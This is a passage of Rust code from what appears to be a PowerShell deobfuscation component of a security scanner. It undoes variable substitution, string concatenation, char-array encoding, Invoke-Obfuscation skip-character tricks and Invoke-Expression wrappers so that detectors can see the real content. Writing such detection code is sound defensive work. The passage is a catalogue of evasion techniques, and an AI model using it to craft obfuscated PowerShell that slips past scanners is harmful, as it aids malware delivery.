                    .join(sep.as_str())
            };
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    for caps in PS_VAR_CONCAT_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(rhs)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let mut joined = String::new();
        let mut ok = false;
        for part in PS_VAR_REF_RE.captures_iter(rhs.as_str()) {
            let Some(name) = part.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(value) = bindings.get(&name.to_ascii_lowercase()) else {
                ok = false;
                break;
            };
            joined.push_str(value);
            ok = true;
        }
        if ok && !joined.is_empty() {
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    insert_ps_interpolated_double_quote_bindings(text, &mut bindings, false);
    if bindings.is_empty() {
        return text.to_string();
    }

    let text = expand_ps_double_quoted_interpolations(text, &bindings);

    // Replace $name references with 'value' (quoted, so URL regexes still match).
    // Collect all replacements from original text, then apply in reverse order.
    let matches: Vec<(usize, usize, String)> = PS_VAR_REF_RE
        .captures_iter(&text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let name = caps.get(1)?.as_str();
            // Don't replace inside assignment LHS — heuristic: skip refs
            // immediately followed by an assignment operator, but not equality.
            let after = &text[full.end()..];
            let after_trim = after.trim_start();
            if is_ps_assignment_operator(after_trim) {
                return None;
            }
            bindings.get(&name.to_ascii_lowercase()).and_then(|v| {
                if is_large_literal_carrier(v) {
                    return None;
                }
                Some((full.start(), full.end(), format!("'{}'", v)))
            })
        })
        .collect();

    let mut out = text;
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_environment_references(text: &str, env: &Environment) -> String {
    if !text.to_ascii_lowercase().contains("$env:") {
        return text.to_string();
    }
    PS_ENV_REF_RE
        .replace_all(text, |caps: &regex::Captures<'_>| {
            let Some(full) = caps.get(0) else {
                return String::new();
            };
            let Some(name) = caps.get(1) else {
                return full.as_str().to_string();
            };
            let Some(value) = env.get(name.as_str()) else {
                return full.as_str().to_string();
            };
            match ps_env_ref_quote_context(text, full.start()) {
                PsEnvRefQuoteContext::SingleQuoted => full.as_str().to_string(),
                PsEnvRefQuoteContext::DoubleQuoted => value.replace('`', "``").replace('"', "`\""),
                PsEnvRefQuoteContext::Expression
                    if ps_env_ref_has_unquoted_path_suffix(text, full.end()) =>
                {
                    value
                }
                PsEnvRefQuoteContext::Expression => format!("'{}'", value.replace('\'', "''")),
            }
        })
        .into_owned()
}

fn ps_env_ref_has_unquoted_path_suffix(text: &str, pos: usize) -> bool {
    text[pos..]
        .chars()
        .next()
        .is_some_and(|ch| matches!(ch, '\\' | '/'))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PsEnvRefQuoteContext {
    Expression,
    SingleQuoted,
    DoubleQuoted,
}

fn ps_env_ref_quote_context(text: &str, pos: usize) -> PsEnvRefQuoteContext {
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = text[..pos].chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '\'' if !in_double => {
                if in_single && chars.peek() == Some(&'\'') {
                    chars.next();
                } else {
                    in_single = !in_single;
                }
            }
            '"' if !in_single => {
                in_double = !in_double;
            }
            '`' if in_double => {
                chars.next();
            }
            _ => {}
        }
    }
    if in_single {
        PsEnvRefQuoteContext::SingleQuoted
    } else if in_double {
        PsEnvRefQuoteContext::DoubleQuoted
    } else {
        PsEnvRefQuoteContext::Expression
    }
}

fn expand_ps_double_quoted_interpolations(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> String {
    let matches: Vec<(usize, usize, String)> = PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let value = caps.get(2)?;
            if !value.as_str().contains('$') {
                return None;
            }
            if looks_like_quoted_ps_command_wrapper(value.as_str()) {
                return None;
            }
            let expanded = interpolate_ps_double_quoted_string(value.as_str(), bindings, false)?;
            Some((value.start(), value.end(), expanded))
        })
        .collect();
    if matches.is_empty() {
        return text.to_string();
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn looks_like_quoted_ps_command_wrapper(value: &str) -> bool {
    value.contains(';') && value.contains('=') && value.contains('$')
}

fn interpolate_ps_double_quoted_string(
    value: &str,
    bindings: &std::collections::HashMap<String, String>,
    preserve_env_refs: bool,
) -> Option<String> {
    let bytes = value.as_bytes();
    let mut out = String::with_capacity(value.len());
    let mut i = 0usize;
    let mut changed = false;
    while i < value.len() {
        if bytes[i] != b'$' {
            let ch = value[i..].chars().next()?;
            out.push(ch);
            i += ch.len_utf8();
            continue;
        }
        if bytes.get(i + 1) == Some(&b'{') {
            let name_start = i + 2;
            let Some(rel_end) = value[name_start..].find('}') else {
                out.push('$');
                i += 1;
                continue;
            };
            let name_end = name_start + rel_end;
            let name = &value[name_start..name_end];
            if name
                .get(..4)
                .is_some_and(|prefix| prefix.eq_ignore_ascii_case("env:"))
            {
                if !preserve_env_refs {
                    return None;
                }
                let env_name = &name[4..];
                if env_name.is_empty()
                    || !env_name
                        .bytes()
                        .all(|b| b.is_ascii_alphanumeric() || b == b'_')
                {
                    return None;
                }
                out.push_str(&value[i..=name_end]);
                i = name_end + 1;
                changed = true;
                continue;
            }
            if name.is_empty() || !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
                return None;
            }
            let replacement = bindings.get(&name.to_ascii_lowercase())?;
            if is_large_literal_carrier(replacement) {
                return None;
            }
            out.push_str(replacement);
            i = name_end + 1;
            changed = true;
            continue;
        }
        let name_start = i + 1;
        let Some(first) = bytes.get(name_start) else {
            out.push('$');
            i += 1;
            continue;
        };
        if value[name_start..]
            .get(..4)
            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("env:"))
        {
            if !preserve_env_refs {
                return None;
            }
            let env_name_start = name_start + 4;
            let mut env_name_end = env_name_start;
            while bytes
                .get(env_name_end)
                .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
            {
                env_name_end += 1;
            }
            if env_name_end > env_name_start {
                out.push_str(&value[i..env_name_end]);
                i = env_name_end;
                changed = true;
                continue;
            }
        }
        if !(first.is_ascii_alphabetic() || *first == b'_') {
            out.push('$');
            i += 1;
            continue;
        }
        let mut name_end = name_start + 1;
        while bytes
            .get(name_end)
            .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
        {
            name_end += 1;
        }
        let name = &value[name_start..name_end];
        let replacement = bindings.get(&name.to_ascii_lowercase())?;
        if is_large_literal_carrier(replacement) {
            return None;
        }
        out.push_str(replacement);
        i = name_end;
        changed = true;
    }
    changed.then_some(out)
}

fn is_large_literal_carrier(value: &str) -> bool {
    value.len() >= 64 * 1024
        || (value.len() >= 8192
            && value
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')))
}

fn is_ps_assignment_operator(text: &str) -> bool {
    if text.starts_with("==") {
        return false;
    }
    text.starts_with('=')
        || text.starts_with("+=")
        || text.starts_with("-=")
        || text.starts_with("*=")
        || text.starts_with("/=")
        || text.starts_with("%=")
}

// ---- Space-concat expander (Pattern C) ----

#[allow(clippy::expect_used)]
static SPACE_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // 'a' 'b' 'c' ...  (2+ adjacent single-quoted strings separated by whitespace ONLY,
    // no + or - operator between them)
    // The separator between strings is pure whitespace (no operator chars).
    Regex::new(r#"'[^']*'(?:\s+'[^']*')+"#).expect("space concat")
});

fn expand_space_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            // Extract all single-quoted parts
            let parts_re = regex::Regex::new(r"'([^']*)'").ok()?;
            let parts: Vec<String> = parts_re
                .captures_iter(s)
                .filter_map(|c| c.get(1).map(|cap| cap.as_str().to_string()))
                .collect();
            if parts.len() < 2 {
                return None;
            }
            let combined = parts.join("");
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

// ---- Char-array chunk expander (Pattern D) ----

#[allow(clippy::expect_used)]
static CHAR_ARRAY_CHUNK_RE: Lazy<Regex> = Lazy::new(|| {
    // ([char[]]@( N1,N2,N3 )-join '')
    Regex::new(r#"\(\[char\[\]\]\s*@\(\s*((?:\d+\s*,\s*)*\d+)\s*\)\s*-join\s*['"][^'"]*['"]\s*\)"#)
        .expect("char arr chunk")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?String\]::Join\s*\(\s*['"]([^'"]*)['"]\s*,\s*\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*\)"#,
    )
    .expect("string join char array")
});

#[allow(clippy::expect_used)]
static UNARY_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)-join\s+\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*"#,
    )
    .expect("unary join char array")
});

fn decode_char_array_nums(nums_str: &str) -> Option<String> {
    let chars: Vec<char> = nums_str
        .split(',')
        .filter_map(|s| s.trim().parse::<u32>().ok())
        .filter_map(char::from_u32)
        .collect();
    if chars.is_empty() {
        return None;
    }
    Some(chars.into_iter().collect())
}

fn decode_ps_char_array_nums(nums_str: &str, separator: &str) -> Option<String> {
    let chars: Vec<String> = nums_str
        .split(',')
        .map(|part| {
            let value = parse_ps_char_codepoint(part.trim())?;
            char::from_u32(value).map(|ch| ch.to_string())
        })
        .collect::<Option<_>>()?;
    if chars.is_empty() || chars.len() > 128 * 1024 {
        return None;
    }
    Some(chars.join(separator))
}

fn expand_string_join_char_arrays(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let separator = caps.get(1)?.as_str();
            let decoded = decode_ps_char_array_nums(caps.get(2)?.as_str(), separator)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_unary_join_char_arrays(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = UNARY_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let decoded = decode_ps_char_array_nums(caps.get(1)?.as_str(), "")?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_char_array_concat_chunks(text: &str) -> String {
    let mut manual_matches = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = text[search_from..].to_ascii_lowercase().find("([char[]]@(") {
        let start = search_from + rel;
        let Some((mut end, first)) = parse_char_array_chunk_at(text, start) else {
            search_from = start + 1;
            continue;
        };
        let mut decoded = first;
        let mut count = 1;
        loop {
            let rest = &text[end..];
            let trimmed = rest.trim_start();
            if !trimmed.starts_with('+') {
                break;
            }
            let ws = rest.len() - trimmed.len();
            let after_plus = &trimmed[1..];
            let after_plus_trimmed = after_plus.trim_start();
            let next_start = end + ws + 1 + (after_plus.len() - after_plus_trimmed.len());
            let Some((next_end, next_decoded)) = parse_char_array_chunk_at(text, next_start) else {
                break;
            };
            decoded.push_str(&next_decoded);
            end = next_end;
            count += 1;
        }
        if count > 1 {
            manual_matches.push((start, end, format!("'{}'", decoded)));
            search_from = end;
        } else {
            search_from = start + 1;
        }
    }
    if !manual_matches.is_empty() {
        let mut out = text.to_string();
        for (start, end, replacement) in manual_matches.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
        return out;
    }

    let chunks: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|m| {
            let full = m.get(0)?;
            let decoded = decode_char_array_nums(m.get(1)?.as_str())?;
            Some((full.start(), full.end(), decoded))
        })
        .collect();
    let mut matches = Vec::new();
    let mut i = 0;
    while i < chunks.len() {
        let (start, mut end, first) = chunks[i].clone();
        let mut decoded = first;
        let mut j = i + 1;
        while j < chunks.len() {
            let between = text[end..chunks[j].0].trim();
            if between != "+" {
                break;
            }
            decoded.push_str(&chunks[j].2);
            end = chunks[j].1;
            j += 1;
        }
        if j > i + 1 {
            matches.push((start, end, format!("'{}'", decoded)));
            i = j;
        } else {
            i += 1;
        }
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_char_array_chunk_at(text: &str, start: usize) -> Option<(usize, String)> {
    let lower = text[start..].to_ascii_lowercase();
    let prefix = "([char[]]@(";
    if !lower.starts_with(prefix) {
        return None;
    }
    let nums_start = start + prefix.len();
    let nums_end = text[nums_start..].find(')')? + nums_start;
    let decoded = decode_char_array_nums(&text[nums_start..nums_end])?;
    let after_nums = &text[nums_end + 1..];
    let after_trimmed = after_nums.trim_start();
    if !after_trimmed.to_ascii_lowercase().starts_with("-join") {
        return None;
    }
    let chunk_end = nums_end + 1 + after_nums.find(')')? + 1;
    Some((chunk_end, decoded))
}

fn expand_char_array_chunks(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let s = decode_char_array_nums(caps.get(1)?.as_str())?;
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    // After each chunk becomes 'x', a chain like 'a' + 'b' + 'c' is now standard PS
    // concatenation — expand_string_concat (already in pipeline) handles that.
    out
}

// ---- Skip-Nth-Char decoder (Invoke-Obfuscation pattern) ----

#[allow(clippy::expect_used)]
static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: function NAME(...){ ... } or New-Item function definitions.
    // Captures: group 1 = fn name from `function NAME`, group 2 = fn name from `-n/-Name NAME`
    // The body must contain a do{...} until loop with $idx += N pattern.
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{([^{}]*?do\s*\{[^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}[^{}]*?until[^{}]*?)\}"#
    ).expect("skip-nth def")
});

#[allow(clippy::expect_used)]
static SKIP_NTH_INIT_RE: Lazy<Regex> = Lazy::new(|| {
    // Extracts: $idx = N (initializer before the loop)
    Regex::new(r#"\$(\w+)\s*=\s*(\d+)"#).expect("skip-nth init")
});

#[allow(clippy::expect_used)]
static INVOKE_EXPRESSION_WRAPPER_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{[^{}]*invoke-expression[^{}]*\}"#,
    )
    .expect("invoke-expression wrapper def")
});

fn expand_invoke_expression_wrappers(text: &str) -> String {
    let names: Vec<String> = INVOKE_EXPRESSION_WRAPPER_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            caps.get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .collect();
    if names.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for name in names {
        out = inline_ps_literal_calls(&out, &name);
    }
    out
}

fn expand_literal_substring_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !lower.contains(".substring")
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        let full_substring = PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body);
        let tail_substring = full_substring
            .is_none()
            .then(|| PS_LITERAL_TAIL_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body))
            .flatten();
        if let Some(caps) = full_substring.as_ref().or(tail_substring.as_ref()) {
            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
                continue;
            };
            let len_var = caps.get(3).map(|m| m.as_str());

            let param_index = parse_ps_function_param_indices(&params);
            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let len_idx = match len_var {
                Some(len_var) => match param_index.get(&len_var.to_ascii_lowercase()).copied() {
                    Some(idx) => Some(idx),
                    None => continue,
                },
                None => None,
            };

            let binding = PsSubstringExtractorParamBinding {
                value_idx,
                value_name: value_var,
                arg_count: param_index.len(),
                start_idx,
                start_name: start_var,
                len_idx,
                len_name: len_var,
            };
            out = inline_ps_literal_substring_calls(&out, &name, binding);
            continue;
        }

        let Some(caps) = PS_LITERAL_CONST_SUBSTRING_EXTRACTOR_BODY_RE.captures(&body) else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(start) = caps.get(2).and_then(|m| m.as_str().parse::<usize>().ok()) else {
            continue;
        };
        let len = caps.get(3).and_then(|m| m.as_str().parse::<usize>().ok());
        if start > 8192 || len.is_some_and(|len| len > 8192) {
            continue;
        }

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_const_substring_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            start,
            len,
        );
    }
    out
}

fn expand_literal_remove_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !lower.contains(".remove")
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        if let Some(caps) = PS_LITERAL_REMOVE_EXTRACTOR_BODY_RE.captures(&body) {
            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
                continue;
            };
            let count_var = caps.get(3).map(|m| m.as_str());

            let param_index = parse_ps_function_param_indices(&params);
            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let count_idx = match count_var {
                Some(count_var) => {
                    match param_index.get(&count_var.to_ascii_lowercase()).copied() {
                        Some(idx) => Some(idx),
                        None => continue,
                    }
                }
                None => None,
            };

            let binding = PsRemoveExtractorParamBinding {
                value_idx,
                value_name: value_var,
                arg_count: param_index.len(),
                start_idx,
                start_name: start_var,
                count_idx,
                count_name: count_var,
            };
            out = inline_ps_literal_remove_calls(&out, &name, binding);
            continue;
        }

        let Some(caps) = PS_LITERAL_CONST_REMOVE_EXTRACTOR_BODY_RE.captures(&body) else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(start) = caps.get(2).and_then(|m| m.as_str().parse::<usize>().ok()) else {
            continue;
        };
        let count = caps.get(3).and_then(|m| m.as_str().parse::<usize>().ok());
        if start > 8192 || count.is_some_and(|count| count > 8192) {
            continue;
        }

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_const_remove_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            start,
            count,
        );
    }
    out
}

fn expand_literal_insert_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !lower.contains(".insert")
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        let Some(caps) = PS_LITERAL_INSERT_EXTRACTOR_BODY_RE.captures(&body) else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(start_var) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(insert_var) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };
        let Some(start_idx) = param_index.get(&start_var.to_ascii_lowercase()).copied() else {
            continue;
        };
        let Some(insert_idx) = param_index.get(&insert_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        let binding = PsInsertExtractorParamBinding {
            value_idx,
            value_name: value_var,
            arg_count: param_index.len(),
            start_idx,
            start_name: start_var,
            insert_idx,
            insert_name: insert_var,
        };
        out = inline_ps_literal_insert_calls(&out, &name, binding);
    }
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        let Some(caps) = PS_LITERAL_CONST_INSERT_EXTRACTOR_BODY_RE.captures(&body) else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(start) = caps.get(2).and_then(|m| m.as_str().parse::<usize>().ok()) else {
            continue;
        };
        let Some(insert) = caps
            .get(3)
            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
        else {
            continue;
        };
        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_const_insert_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            start,
            &insert,
        );
    }
    out
}

fn expand_literal_string_case_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !(lower.contains(".tolower") || lower.contains(".toupper"))
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        let Some(caps) = PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE.captures(&body) else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(kind) = caps
            .get(2)
            .and_then(|m| PsStringCaseKind::from_method(m.as_str()))
        else {
            continue;
        };

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_string_case_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            kind,
        );
    }
    out
}

fn expand_literal_concat_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !(text.contains('+')
            || lower.contains("string]::concat")
            || lower.contains("string]::join")
            || lower.contains("string]::format")
            || lower.contains("-f"))
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        let param_index = parse_ps_function_param_indices(&params);
        let (expr, sep, template) =
            if let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
                let Some(expr) = caps.get(1) else { continue };
                let after_expr = skip_ascii_ws(body.as_bytes(), expr.end());
                if body.as_bytes().get(after_expr) == Some(&b'+') {
                    continue;
                }
                (expr, String::new(), None)
            } else if let Some(caps) = PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
                let Some(expr) = caps.get(1) else { continue };
                (expr, String::new(), None)
            } else if let Some(caps) = PS_LITERAL_STRING_JOIN_EXTRACTOR_BODY_RE.captures(&body) {
                let Some(sep) = caps
                    .get(1)
                    .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
                else {
                    continue;
                };
                if sep.len() > 512 {
                    continue;
                }
                let Some(expr) = caps.get(2) else { continue };
                (expr, sep, None)
            } else if let Some(caps) = PS_LITERAL_FORMAT_EXTRACTOR_BODY_RE.captures(&body) {
                let Some(template) = caps
                    .get(1)
                    .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
                else {
                    continue;
                };
                if template.len() > 8192 {
                    continue;
                }
                let Some(expr) = caps.get(2) else { continue };
                (expr, String::new(), Some(template))
            } else if let Some(caps) = PS_LITERAL_STRING_FORMAT_EXTRACTOR_BODY_RE.captures(&body) {
                let Some(template) = caps
                    .get(1)
                    .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
                else {
                    continue;
                };
                if template.len() > 8192 {
                    continue;
                }
                let Some(expr) = caps.get(2) else { continue };
                (expr, String::new(), Some(template))
            } else {
                continue;
            };
        let Some(parts) = ps_literal_concat_extractor_parts(expr.as_str(), &param_index) else {
            continue;
        };
        let binding = PsConcatExtractorParamBinding {
            parts,
            arg_count: param_index.len(),
            sep,
            template,
        };
        out = inline_ps_literal_concat_calls(&out, &name, binding);
    }
    out
}

fn ps_literal_concat_extractor_parts<'a>(
    expr: &'a str,
    param_index: &std::collections::HashMap<String, usize>,
) -> Option<Vec<PsConcatExtractorPart<'a>>> {
    let mut parts = Vec::new();
    for caps in PS_LITERAL_CONCAT_VAR_RE.captures_iter(expr) {
        let name = caps.get(1)?.as_str();
        let idx = param_index.get(&name.to_ascii_lowercase()).copied()?;
        parts.push(PsConcatExtractorPart { idx, name });
    }
    (parts.len() >= 2 && parts.len() <= 8).then_some(parts)
}

fn expand_literal_index_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !(text.contains('[')
            || lower.contains(".chars")
            || lower.contains(".get_chars")
            || lower.contains(".tochararray"))
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        let Some(caps) = PS_LITERAL_INDEX_EXTRACTOR_BODY_RE
            .captures(&body)
            .or_else(|| PS_LITERAL_CHARS_EXTRACTOR_BODY_RE.captures(&body))
            .or_else(|| PS_LITERAL_TOCHARARRAY_INDEX_EXTRACTOR_BODY_RE.captures(&body))
        else {
            if let Some(caps) = PS_LITERAL_CONST_INDEX_EXTRACTOR_BODY_RE
                .captures(&body)
                .or_else(|| PS_LITERAL_CONST_CHARS_EXTRACTOR_BODY_RE.captures(&body))
                .or_else(|| PS_LITERAL_CONST_TOCHARARRAY_INDEX_EXTRACTOR_BODY_RE.captures(&body))
            {
                let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                    continue;
                };
                let Some(index) = caps.get(2).and_then(|m| m.as_str().parse::<usize>().ok()) else {
                    continue;
                };
                let param_index = parse_ps_function_param_indices(&params);
                let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied()
                else {
                    continue;
                };
                out = inline_ps_literal_const_index_calls(
                    &out,
                    &name,
                    value_idx,
                    value_var,
                    param_index.len(),
                    index,
                );
            }
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(index_var) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };
        let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        let binding = PsIndexExtractorParamBinding {
            value_idx,
            value_name: value_var,
            index_idx,
            index_name: index_var,
            arg_count: param_index.len(),
        };
        out = inline_ps_literal_index_calls(&out, &name, binding);
    }
    out
}

fn expand_literal_replace_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !lower.contains("replace")
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        if let Some(caps) = PS_LITERAL_REPLACE_EXTRACTOR_BODY_RE
            .captures(&body)
            .or_else(|| PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE.captures(&body))
        {
            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(needle_var) = caps.get(2).map(|m| m.as_str()) else {
                continue;
            };
            let Some(repl_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };

            let param_index = parse_ps_function_param_indices(&params);
            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let Some(needle_idx) = param_index.get(&needle_var.to_ascii_lowercase()).copied()
            else {
                continue;
            };
            let Some(repl_idx) = param_index.get(&repl_var.to_ascii_lowercase()).copied() else {
                continue;
            };

            let binding = PsReplaceExtractorParamBinding {
                value_idx,
                value_name: value_var,
                arg_count: param_index.len(),
                needle_idx,
                needle_name: needle_var,
                repl_idx,
                repl_name: repl_var,
            };
            out = inline_ps_literal_replace_calls(&out, &name, binding);
            continue;
        }

